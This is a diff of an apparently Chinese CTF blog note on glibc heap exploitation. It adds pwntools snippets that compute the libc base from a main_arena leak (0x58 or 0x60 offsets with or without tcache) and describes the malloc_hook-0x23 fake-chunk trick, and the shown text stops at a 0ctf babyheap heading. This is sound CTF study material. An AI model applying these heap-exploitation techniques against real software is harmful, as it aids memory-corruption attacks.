@@ -1,10 +1,30 @@
 ---
 title: malloc hook
-tags: [ctf-pwn,exp]
+tags: [ctf-pwn,heap]
 date: 2023-11-04 10:42:00
 categories: [ctf-pwn]
 excerpt: malloc hook 泄露libc
 ---
+
+### 关于什么时候是0x58，什么时候是0x60
+
+是因为tcache的问题，之前一直都不知道（
+
+```python
+main_arena = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00')) - 0x60 # tcache
+main_arena = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00')) - 0x58 # no tcache
+main_arena = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00')) - offset # other condition(not unsorted bin leak)
+malloc_hook = main_arena - 0x10
+libc_base = malloc_hook - libc.sym['__malloc_hook']
+```
+
+### malloc hook - 0x23
+
+在malloc hook - 0x23分配fakechunk可以达成size=0x70的检查，因为这个地址上size这里是0x7f，而检查机制不会检查标志位
+
+> libc2.31版本中这个位置上的数据已经不再是0x7f
+
+### 0ctfbabyheap
 
 首先查看保护，发现全开
 
